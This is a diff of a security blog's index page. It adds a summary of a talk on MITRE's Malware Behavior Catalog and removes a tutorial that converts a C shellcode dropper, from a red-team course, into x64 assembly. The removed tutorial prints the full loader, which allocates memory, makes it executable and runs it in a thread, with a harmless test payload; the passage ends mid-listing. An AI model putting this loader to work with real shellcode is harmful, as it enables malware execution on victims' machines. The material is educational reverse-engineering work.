@@ -37,6 +37,41 @@
     <article class="post-item">
         <header class="article-header">
             <h2 class="post-title">
+                <a href="../talking-about-mitres-malware-behavior-catalog.html">Talking about Mitre's Malware Behavior Catalog</a>
+            </h2>
+            <div class="article-meta">
+                <time datetime="2022-08-02T15:06:00+08:00">Tue 02 August 2022</time>
+                <span>•</span>
+                <a href="../category/malware.html">malware</a>
+            </div>
+        </header>
+
+        <div class="article-content">
+            <p>I gave a 10-minute lightning talk at the recently concluded Blackhat Middle East &amp; Africa community meetup. The topic is about Mitre's Malware Behavior Catalog (MBC) framework and the existing tools for it. My reason for selecting this topic is because I feel that more people should know about Mitre's not-so-well-known project.</p>
+<p><img alt="talking-about-mitres-malware-behavior-catalog-01" src="../images/talking-about-mitres-malware-behavior-catalog-01.png" /></p>
+<h2 id="a-brief-overview">A brief overview</h2>
+<p>MBC is a framework made by Mitre, similar to ATT&amp;CK, but focuses on malware. It lists down the common objectives and behaviors commonly seen in malware. The purpose is to have standardize reporting so that everyone would use the same definitions when writing and talking about malware. This also aids with analysis and correlation with other tools.</p>
+<p>It has it's own matrix with malware objectives as headers for columns and an entry for each behavior. Each behavior then has a list of methods that explains how that behavior is achieved, example of malware that uses it, and also IDs of ATT&amp;CK techniques related to the behavior.</p>
+<p><img alt="talking-about-mitres-malware-behavior-catalog-02" src="../images/talking-about-mitres-malware-behavior-catalog-02.png" /></p>
+<h2 id="the-tools">The tools</h2>
+<p>There are a number of existing tools that make use of MBC. <a href="https://github.com/mandiant/capa">Flare's Capa</a> lists down MBC along with the related ATT&amp;CK techniques and there's also a repository of MBC community rules for the Cuckoo Sandox.</p>
+<p>I find MBC to have a lot of potential so I decided to contribute by making my own tool called <a href="https://github.com/accidentalrebel/mbcscan">MBCScan</a>. It's a simple tool that uses Capa which scans a supplied file and lists the MBC behaviors and objectives associated with it. It also allows you to explore the related information and relationships directly from the command line.</p>
+<p><img alt="talking-about-mitres-malware-behavior-catalog-03" src="../images/talking-about-mitres-malware-behavior-catalog-03.png" /></p>
+<h2 id="the-future">The future</h2>
+<p>MBC has been around for a number of years already but it still has not risen in popularity. In spite of this, it's still being continuously updated. I hope that by sharing and talking about it it'll help spread awareness and, hopefully, get some adoption.</p>
+<p>You can find more information about the project via this <a href="https://www.youtube.com/watch?v=qZef-SoREdY">video presentation from Mitre</a>. The Github project is <a href="https://github.com/MBCProject">here</a>. And the slides are available <a href="https://docs.google.com/presentation/d/1w89wccaYr2g6104l73Xt2IUMGis_zgTB6krRC1q09Dw/edit?usp=sharing">here</a>. </p>
+        </div>
+
+        <div class="tags">
+            <a href="../tag/malware.html" class="tag">malware</a>
+            <a href="../tag/analysis.html" class="tag">analysis</a>
+            <a href="../tag/mitre.html" class="tag">mitre</a>
+            <span class="tag">+1 more</span>
+        </div>
+    </article>
+    <article class="post-item">
+        <header class="article-header">
+            <h2 class="post-title">
                 <a href="../string-av-evasion-in-x64-assembly-part-2.html">String anti-virus evasion in x64 assembly (Part 2)</a>
             </h2>
             <div class="article-meta">
@@ -576,438 +611,6 @@ The "powershell" string has 11 characters so we use 16.</p>
             <a href="../tag/av.html" class="tag">av</a>
         </div>
     </article>
-    <article class="post-item">
-        <header class="article-header">
-            <h2 class="post-title">
-                <a href="../converting-a-malware-dropper-to-x64-assembly.html">Converting a malware dropper to x64 assembly</a>
-            </h2>
-            <div class="article-meta">
-                <time datetime="2022-07-03T09:18:00+08:00">Sun 03 July 2022</time>
-                <span>•</span>
-                <a href="../category/misc.html">misc</a>
-            </div>
-        </header>
-
-        <div class="article-content">
-            <p>In this post I'll be listing down lessons I learned while converting a simple malware dropper written in C to x64 assembly. </p>
-<p>I started this project as a way to deepen my understanding of assembly so I could be better in malware development and reverse engineering (And also because I love coding in assembly and would always find an excuse to use it).</p>
-<h2 id="what-to-expect">What to expect</h2>
-<p>I'll be going through sections of the C file and show the how it can be written accordingly in x64 Windows assembly. Take note, however, that the conversion is not one-to-one, meaning there are other ways of writing it. What I did was to structure the assembly code so that you can easily compare it with the C code while making sure that the end result will be the same.</p>
-<p>I won't be covering the basics of assembly because <a href="https://sonictk.github.io/asm_tutorial/">this post</a> does a better job of doing that. And as for the assembler, I'll be using <a href="https://www.nasm.us/">nasm</a> because this is the one I'm most familiar with.</p>
-<blockquote>
-<p><strong>Disclaimer:</strong> I am not an expert in any of these topics. I'm just someone who learned things and wish to share it to others. If I'm wrong about anything feel free to point it out. </p>
-</blockquote>
-<h2 id="credits">Credits</h2>
-<p>The malware dropper that we'll be converting is made by <a href="https://twitter.com/sektor7net">@reenz0h</a>. I found it in <a href="https://github.com/kymb0/Malware_learns">kymb0's repository</a> and I learned that it's a part of the <a href="https://institute.sektor7.net/">Red Team Operator course by Sektor7</a>. I've read good things about the course and I plan to take it in the future, you should check it out too.</p>
-<h2 id="the-dropper">The dropper</h2>
-<p>Here's the malware dropper that we'll be converting:</p>
-<div class="codehilite"><pre><span></span><code><span class="cm">/*</span>
-
-<span class="cm"> Red Team Operator course code template</span>
-<span class="cm"> storing payload in .data section</span>
-
-<span class="cm"> author: reenz0h (twitter: @sektor7net)</span>
-
-<span class="cm">*/</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
-
-<span class="c1">// 4 byte payload</span>
-<span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">payload</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
-<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
-<span class="w">    </span><span class="mh">0xcc</span><span class="p">,</span><span class="w">       </span><span class="c1">// INT3</span>
-<span class="w">    </span><span class="mh">0xc3</span><span class="w">        </span><span class="c1">// RET</span>
-<span class="p">};</span>
-<span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">payload_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span>
-
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-
-<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">exec_mem</span><span class="p">;</span>
-<span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">rv</span><span class="p">;</span>
-<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">th</span><span class="p">;</span>
-<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">oldprotect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
-
-<span class="w">    </span><span class="c1">// Allocate a memory buffer for payload.</span>
-<span class="w">    </span><span class="n">exec_mem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">,</span><span class="w"> </span><span class="n">MEM_COMMIT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MEM_RESERVE</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="p">);</span>
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;payload addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">);</span>
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;exec_mem addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>
-
-<span class="w">    </span><span class="c1">// Copy payload to new buffer</span>
-<span class="w">    </span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">);</span>
-
-<span class="w">    </span><span class="c1">// Make new buffer as executable</span>
-<span class="w">    </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
-
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Hit me!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-<span class="w">    </span><span class="n">getchar</span><span class="p">();</span>
-
-<span class="w">    </span><span class="c1">// If all good, run the payload</span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">rv</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="n">th</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="w"> </span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
-<span class="w">            </span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>Here is what the code does:</p>
-<ul>
-<li>Allocates memory buffer with size <code>payload_len</code></li>
-<li>Copies <code>payload</code> to the buffer</li>
-<li>The buffer's memory protection is changed to <code>PAGE_EXECUTE_READ</code> which allows for code execution</li>
-<li>A thread is created that runs the payload, which runs indefinitely</li>
-</ul>
-<p>It doesn't seem that the program is doing much when run. All we see are the payload and exec_mem addresses for debugging purposes and nothing much else.</p>
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-01" src="../images/converting-a-malware-dropper-to-x64-assembly-01.png" /></p>
-<p>The most interesting parts with this code will be seen under a debugger, which I'll go through later in this post.</p>
-<h2 id="including-external-functions">Including external functions</h2>
-<p>In C, if we want to to use a Windows API function, we need to include the necessary header files and make sure to supply required library names via the linker, like so:</p>
-<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
-</code></pre></div>
-
-<p>x64 assembly does not use header files so the process is done differently. First, the necessary ".lib" files should be supplied to the linker:</p>
-<div class="codehilite"><pre><span></span><code>link<span class="w"> </span>dropper_data.obj<span class="w"> </span>/subsystem:console<span class="w"> </span>/out:dropper_data.exe<span class="w"> </span>kernel32.lib<span class="w"> </span>msvcrt.lib
-</code></pre></div>
-
-<p>Next, every external function that we'll be using in our code needs to be specified as shown below:</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
-<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">printf</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualAlloc</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualProtect</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">RtlMoveMemory</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">getchar</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">CreateThread</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">WaitForSingleObject</span>
-</code></pre></div>
-
-<p>Note that the <code>extern</code> keyword in assembly is different in C. Externs in C are used for <em>exporting</em> symbols while they are used for <em>importing</em> symbols in Assembly. <code>global</code> is the one used for exporting.</p>
-<p>Once the symbols are properly exported then that is when the functions can be used with the <code>call</code> operand.</p>
-<h2 id="the-entrypoint">The entrypoint</h2>
-<p>There needs to be an entry point so that the operating system knows where to jump to start our program. We do this in C by declaring a <code>main</code> function:</p>
-<div class="codehilite"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="p">...</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>In assembly, we declare the entry point with <code>global main</code> (As seen in the previous section) and also supply the <code>main:</code> label within the code. This is where execution will jump to.</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
-<span class="w">   </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
-<span class="w">   </span><span class="na">...</span>
-<span class="w">   </span><span class="na">...</span>
-
-<span class="nl">main:</span>
-<span class="w">   </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
-<span class="w">   </span><span class="na">...</span>
-<span class="w">   </span><span class="na">...</span>
-</code></pre></div>
-
-<h2 id="the-payload">The payload</h2>
-<p>The payload in this example is a simple shellcode made for testing purposes. This can be changed to any shellcode of any length as long as <code>payload_len</code> reflects the new size of the shellcode.</p>
-<div class="codehilite"><pre><span></span><code><span class="c1">// 4 byte payload</span>
-<span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">payload</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
-<span class="w">    </span><span class="mh">0x90</span><span class="p">,</span><span class="w">       </span><span class="c1">// NOP</span>
-<span class="w">    </span><span class="mh">0xcc</span><span class="p">,</span><span class="w">       </span><span class="c1">// INT3</span>
-<span class="w">    </span><span class="mh">0xc3</span><span class="w">        </span><span class="c1">// RET</span>
-<span class="p">};</span>
-<span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">payload_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span>
-</code></pre></div>
-
-<p>In assembly, initializing data is done in <code>segment .data</code>.</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="c1">;; 4 byte payload</span>
-<span class="w">    </span><span class="nf">payload</span><span class="w">         </span><span class="no">db</span><span class="w">  </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0xCC</span><span class="p">,</span><span class="w"> </span><span class="mi">0xC3</span>
-<span class="w">    </span><span class="nf">payload_len</span><span class="w">     </span><span class="no">db</span><span class="w">  </span><span class="mi">4</span>
-</code></pre></div>
-
-<p>We can then check the above data laid out in the <code>.data</code> memory segment using a debugger:</p>
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-02" src="../images/converting-a-malware-dropper-to-x64-assembly-02.png" /></p>
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-03" src="../images/converting-a-malware-dropper-to-x64-assembly-03.png" /></p>
-<p>You may notice that our shellcode is not at the start of the <code>.data</code> segment because there are other data that was declared prior to our payload. This is important to note as the order we declare the data will be the order they will appear in memory.</p>
-<h2 id="initialized-data">Initialized data</h2>
-<p>All data in assembly needs to be declared and initialized before it can be used:</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
-<span class="w">    </span><span class="nf">msg_hello</span><span class="w">       </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hello</span><span class="w"> </span><span class="no">world</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_exec_addr</span><span class="w">   </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">exec_mem</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_pload_addr</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">payload</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">   </span>
-<span class="w">    </span><span class="no">msg_format</span><span class="w">      </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;%</span><span class="mi">-20</span><span class="no">s</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="no">x</span><span class="err">%</span><span class="mi">-016</span><span class="no">p</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_hit_me</span><span class="w">      </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hit</span><span class="w"> </span><span class="no">me</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_format</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_pload_addr</span><span class="p">]</span>
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span>
-<span class="w">    </span><span class="na">...</span>
-</code></pre></div>
-
-<p>This is optional in C as you can pass data (like a string) directly to a function without adding it to a variable:</p>
-<div class="codehilite"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;payload addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">);</span>
-<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%-20s : 0x%-016p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;exec_mem addr&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>
-</code></pre></div>
-
-<p>However, under the hood, the C compiler actually places these data on the <code>.data</code> segment for you automatically. If you were to compile and run the C program you would see that the strings are in the <code>.data</code> segment.</p>
-<h2 id="uninitialized-data">Uninitialized data</h2>
-<p>Memory of certain sizes can be reserved so that it can be used later in a program. These unitialized data is declared not in a <code>.data</code> segment but in a <code>.bss</code> segment <a href="https://en.wikipedia.org/wiki/.bss">(more here)</a>.</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.bss</span><span class="w">    </span>
-<span class="w">    </span><span class="no">exec_mem</span><span class="w">    </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span>
-<span class="w">    </span><span class="nf">old_protect</span><span class="w"> </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span>
-</code></pre></div>
-
-<p>Nasm provides specific "pseudo-instructions" for declaring unitialized data like <code>resb</code> (reserve byte), <code>resw</code> (reserve word), and so on. </p>
-<p>Alternatively, this can be written like this:</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.bss</span><span class="w">    </span>
-<span class="w">    </span><span class="no">exec_mem</span><span class="w">        </span><span class="no">db</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="no">dup</span><span class="w"> </span><span class="p">(</span><span class="err">?</span><span class="p">)</span><span class="w">   </span><span class="c1">; Reserve 8 bytes of ? null value</span>
-<span class="w">    </span><span class="nf">old_protect</span><span class="w">     </span><span class="no">dq</span><span class="w">  </span><span class="mi">1</span><span class="w">           </span><span class="c1">; DQ = QWORD</span>
-</code></pre></div>
-
-<p>It would still work but NASM doesn't like it and would throw a warning.</p>
-<div class="codehilite"><pre><span></span><code>dropper_data.asm:18:<span class="w"> </span>warning:<span class="w"> </span>attempt<span class="w"> </span>to<span class="w"> </span>initialize<span class="w"> </span>memory<span class="w"> </span><span class="k">in</span><span class="w"> </span>BSS<span class="w"> </span>section<span class="w"> </span><span class="sb">`</span>.bss<span class="err">&#39;</span>:<span class="w"> </span>ignored<span class="w"> </span><span class="o">[</span>-w+other<span class="o">]</span>
-</code></pre></div>
-
-<p>The memory for the uninitialized data won't be reserved until the program is loaded. Once it is, we can see the reserved memory in the <code>.data</code> segment. </p>
-<p>Any data we move to the previously unitialized data can now be seen from a debugger. See below for an example:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">],</span><span class="w"> </span><span class="no">rax</span><span class="w">  </span><span class="c1">; Move &quot;000001F96E100000&quot; to memory</span>
-</code></pre></div>
-
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-04" src="../images/converting-a-malware-dropper-to-x64-assembly-04.png" /></p>
-<h2 id="shadow-spaces">Shadow Spaces</h2>
-<p>When calling a function in x64 Windows assembly, programmers must keep in mind to reserve a "shadow space" before doing a <code>call</code> to an external function that is in another language like C or C++. For example:</p>
-<div class="codehilite"><pre><span></span><code>    sub     rsp, 32 
-    call    getchar
-    add     rsp, 32
-</code></pre></div>
-
-<p>But what is a shadow space? <a href="https://stackoverflow.com/questions/30190132/what-is-the-shadow-space-in-x64-assembly">Here</a> is a quick explanation:</p>
-<blockquote>
-<p>The shadow space is the mandatory 32 bytes (4x8 bytes) you must reserve for the called procedure. It just means you must provide 32 bytes on the stack before calling.</p>
-<p>It can be used by compilers to leave a copy of the register values on the stack for later inspection in the debugger. It is meant to be used to make debugging x64 easier.</p>
-</blockquote>
-<p>So in the code above, <code>sub rsp, 32</code> reserves the shadow space before <code>getchar</code> is called. The space on the stack is highlighted in the image below.</p>
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-05" src="../images/converting-a-malware-dropper-to-x64-assembly-05.png" /></p>
-<p><code>call getchar</code> then executes and the "shadow space" gets filled.</p>
-<p><img alt="converting-a-malware-dropper-to-x64-assembly-06" src="../images/converting-a-malware-dropper-to-x64-assembly-06.png" /></p>
-<p>As the caller, we really do not care about the data that gets placed in the shadows space. So after calling the functions we do <code>add rsp, 32</code> to reclaim the shadow space.</p>
-<p>You'll find out the importance of properly reserving and releasing a shadow space especially if you are relying on the stack for saving local variables. Here is a segment of the code where I found out first-hand the importance of handling the shadow space.</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span><span class="w">                </span><span class="c1">;; I need rax for later so I pushed it on the stack</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span><span class="w">             </span><span class="c1">;; printf was expecting a shadow space so it just wrote onto the stack, overwriting the value from RAX before</span>
-
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">getchar</span><span class="w">            </span><span class="c1">;; getchar did the same too</span>
-
-<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span><span class="w">                    </span><span class="c1">;; The value saved by rax is overwritten</span>
-</code></pre></div>
-
-<p>Simply handling the shadow space avoided this problem:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is reserved</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span><span class="w">             </span><span class="c1">;; printf can write to the stack without overwriting data that I need</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is released</span>
-
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is reserved</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">getchar</span><span class="w">            </span><span class="c1">;; same goes with getchar</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is released</span>
-
-<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span><span class="w">                    </span><span class="c1">;; I got the correct value from rax that I pushed</span>
-</code></pre></div>
-
-<p>The above code can be further optimized by only releasing the shadow space after both call to <code>printf</code> and <code>getchar</code>, as shown below:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is reserved</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span><span class="w">             </span><span class="c1">;; printf can write to the stack without overwriting data that I need</span>
-
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">getchar</span><span class="w">            </span><span class="c1">;; same goes with getchar</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">            </span><span class="c1">;; shadow space is released</span>
-
-<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span><span class="w">                    </span><span class="c1">;; I got the correct value from rax that I pushed</span>
-</code></pre></div>
-
-<p>However, there might come a time when the code will change and you might forget to re-add the code that releases and reserves the shadow space. This may lead to hard-to-find stack related problems. To avoid this, just make it a habit to reserve and release the shadow space every time an external function is called.</p>
-<p>As an alternative, you can use a routine that could reserve and release the shadow space automatically like the one below:</p>
-<div class="codehilite"><pre><span></span><code><span class="nl">shadow_call:</span>
-<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rbx</span><span class="w">         </span><span class="c1">; Get the return address pointer in a non-volitile register</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="no">h</span><span class="w">    </span><span class="c1">; Add the shadow space</span>
-<span class="w">    </span><span class="nf">call</span><span class="w"> </span><span class="no">rax</span><span class="w">        </span><span class="c1">; Call the function</span>
-<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="no">h</span><span class="w">    </span><span class="c1">; Remove the shadow space</span>
